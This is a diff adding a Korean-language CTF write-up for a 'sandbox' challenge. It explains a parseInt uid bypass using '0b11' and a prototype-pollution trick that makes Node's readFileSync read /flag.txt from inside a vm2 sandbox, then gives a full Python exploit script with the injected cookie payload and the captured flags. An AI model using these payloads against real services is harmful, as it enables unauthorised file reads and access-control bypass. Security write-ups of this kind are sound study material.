@@ -349,4 +349,200 @@ print(php_filter)
 <img src="images/Multiline PHP challenge/2.JPG">    
 
 ### FLAG     
-hspace{5525f4bd51f0c29ac4f7f762813af852}
+hspace{5525f4bd51f0c29ac4f7f762813af852}     
+      
+## sandbox     
+
+전역 변수로 선언된 `var lastUid = 0` 변수는 유저가 한 명씩 생성될 때마다 값이 1씩 증가한다.   
+                
+`users.add({ username: "admin", password: hashPasswd(rand()), uid: lastUid++ })` 코드로 인해 새로운 유저가 부여받는 `lastUid` 은 1이상의 값을 갖는다.    
+           
+```javascript
+app.use((req,res,next) => {
+	req.userUid = -1
+	req.userData = ""
+
+	let data = req.cookies.data
+	let uid = req.cookies.uid
+	let passwd = req.cookies.passwd
+
+	if(uid == undefined || passwd == undefined)
+		return next()
+
+	let found = false
+	for(let e of users.entries())
+		if(e[0].uid == uid && e[0].password == passwd)
+			found = true
+
+	if(found){
+		req.userUid = uid
+		req.userData = data
+	}
+
+	next()
+})  
+```     
+`/login` 경로에 요청을 보내게 되면 위 로직 또한 실행이 되는데 `uid` 값이 회원가입 시 할당된 `uid` 값과 동일한지 확인하는 로직이 포함되어있다.    
+          
+```javascript
+app.get('/checkout',(req,res) => {
+    ...  
+	if(parseInt(req.userUid) != 0)
+		return res.json({ error: true, msg: "You can't do this sorry" })
+    ...
+})
+```     
+     
+하지만, `/checkout` 경로에 접근하기 위해서는 `parseInt(req.userUid)` 값이 0을 만족해야한다.    
+       
+`admin` 계정을 알아낼 방법은 없기에 `e[0].uid == uid && e[0].password == passwd`과 `parseInt(req.userUid) != 0` 조건문은 둘 다 만족하는 `userUid` 값으로 설정해주면 된다.     
+     
+예를 들어, 유저 `userUid` 값이 3이라고 할 때, 2진수 형태인 `0b11` 값을 넣어주면 두 조건을 만족시킬 수 있다.     
+         
+그 이유는 `parseInt()`에서 `0b11` 값을 2진수로 인식하지 않고 `0` 이후에 나오는 문자는 단순 문자열로 인식하기 때문이다.         
+       
+다음으로, `/checkout` 경로에서 vm2 모듈을 활용하여 exploit을 해야한다.   
+     
+```javascript
+app.get('/checkout',(req,res) => {
+	if(req.userUid == -1 || !req.userData)
+		return res.json({ error: true, msg: "Login first" })
+
+	if(parseInt(req.userUid) != 0)
+		return res.json({ error: true, msg: "You can't do this sorry" })
+
+	if(req.userData.length > 160)
+		return res.json({ error: true, msg: "Too long!!" })
+
+	if(checkoutTimes.has(req.ip) && checkoutTimes.get(req.ip)+1 > now()) {
+		return res.json({ error: true, msg: 'too fast'})
+	}
+	checkoutTimes.set(req.ip,now())
+	
+	let sbx = {
+		readFile: (path) => {
+			if(!(new String(path).toString()).includes('flag'))
+				return fs.readFileSync(path,{encoding: "utf-8"})
+			return null
+		},
+		sum: (args) => args.reduce((a,b)=>a+b),
+	}
+
+	let vm = new vm2.VM({
+		timeout: 20,
+	    sandbox: sbx,
+	    fixAsync: true,
+	    eval: false
+	})
+
+	let result = ":(";
+	try {
+		result = new String(vm.run(`sum([${req.userData}])`))
+	} catch (e) {}
+	res.type('text/plain').send(result)
+})
+```            
+
+`package.json`을 보면, `vm2: ^3.9.9` 버전이라고 나와있어 이후 버전에서 발생한 poc 코드를 찾아보았다.     
+
+https://security.snyk.io/package/npm/vm2     
+
+`3.9.14` 버전에서 터지는 sandbox escape 취약점을 활용하여 RCE를 시도했다.    
+      
+```javascript
+if(req.userData.length > 160)
+	return res.json({ error: true, msg: "Too long!!" })
+```     
+           
+poc 코드를 실행하고 나서 코드 길이에 조건이 걸려있다는 것을 알게 되었고 기존 poc에서 다른 gadget을 찾아 RCE 하는 문제라고 생각하여 대회 당시 계속 코드 길이를 줄이는 방법을 시도했었다...   
+
+```javascript
+let sbx = {
+	readFile: (path) => {
+		if(!(new String(path).toString()).includes('flag'))
+			return fs.readFileSync(path,{encoding: "utf-8"})
+		return null
+	},
+	sum: (args) => args.reduce((a,b)=>a+b),
+}
+```            
+대회가 끝나고 나서야 `fs.readFileSync()` 함수 내에 속성 값들을 Prototype Pollution 취약점으로 변조하여 문제를 해결할 수 있겠다는 생각이 들었다.       
+          
+<img src="images/sandbox/1.png">              
+https://github.com/nodejs/node/blob/main/lib/fs.js#L448     
+           
+옵션으로 `utf-8`을 사용하고 있고, `path` 값이 `int` 가 아니므로 `getValidatePath()` 함수를 호출하게 된다.        
+
+<img src="images/sandbox/2.png">     
+https://github.com/nodejs/node/blob/main/lib/fs.js#L108C3-L108C19       
+        
+`getValidatePath()` 함수는 `internal/fs/utils` 에 정의되어있어 해당 경로에 가보았다.     
+        
+<img src="images/sandbox/3.png">     
+https://github.com/nodejs/node/blob/main/lib/internal/fs/utils.js#L762C7-L762C24       
+             
+`getValidatePath()` 함수는 `toPathIfFileURL()` 함수를 호출하여 `path` 값을 받아온다.      
+             
+<img src="images/sandbox/4.png">    
+https://github.com/nodejs/node/blob/main/lib/internal/url.js#L1495      
+       
+`toPathIfFileURL()` 함수에서 `isURL()` 함수를 통해 `URL` 여부를 판단한다.     
+
+<img src="images/sandbox/5.png">    
+https://github.com/nodejs/node/blob/main/lib/internal/url.js#L765
+       
+`href`, `protocol` 값이 존재하고 `auth`, `path` 가 `undefined` 인 경우 `True`가 된다. 만일 그렇지 않은 경우, `fileURLToPath()` 함수를 호출하게 된다.    
+       
+<img src="images/sandbox/6.png">     
+https://github.com/nodejs/node/blob/main/lib/internal/url.js#L1403
+           
+`fileURLToPath()` 함수에서 `path.protocol` 값이 `file:` 이고 윈도우가 아닐 경우 `getPathFromURLPosix()` 함수를 호출한다. `/flag.txt` 파일을 읽어줘야 하기 때문에 `file:` 를 사용하는 방향을 선택했다.      
+           
+<img src="images/sandbox/7.png">          
+https://github.com/nodejs/node/blob/main/lib/internal/url.js#L1385
+                      
+`getPathFromURLPosix()` 함수에서 `hostname`이 `''` 임을 만족해주고 `pathname` 값으로 `/flag.txt` 를 넣어주면 파일을 읽을 수 있게 된다.           
+                 
+즉, `href`, `protocol` 값 존재 / `auth`, `path` === `undefined` / `hostname`값이  `''`이고 `pathname`이 `/app/flag`가 되도록 Prototype Pollution 취약점을 통해 변조해주면 된다.            
+                        
+`{ href: 'a', protocol: 'file:', hostname: '', pathname: '/flag.txt' }` 로 설정해주었다.     
+          
+## Exploit Code             
+      
+```python
+import requests, json
+url = "http://3.34.190.217:24916"
+# url = "http://localhost:24916"
+# hspace{0eabbdb7a226290c9f5a6eae6d72d6c1}
+
+s = requests.session() 
+r = requests.post(
+        f"{url}/register",
+        json={
+            "username": "guest",
+            "password": "guest"
+        })
+print(r.text)
+
+r = s.post(
+        f"{url}/login",
+        json={
+            "username": "guest",
+            "password": "guest"
+        })
+cookies = r.cookies.get_dict()
+passwd, uid = cookies["passwd"], cookies["uid"]
+print(r.text)
+print(cookies)
+
+cookies["uid"] = "0b11"
+cookies["data"] = """1+1])%3Ba={}%3Ba.__proto__.href='a'%3Ba.__proto__.protocol="file:"%3Ba.__proto__.hostname=""%3Ba.__proto__.pathname="/flag.txt"%3BreadFile({})%3b//"""
+r = requests.get(
+        f"{url}/checkout",
+        cookies=cookies)
+print(r.text)
+```
+      
+ ### FLAG
+ hspace{0eabbdb7a226290c9f5a6eae6d72d6c1}     
+
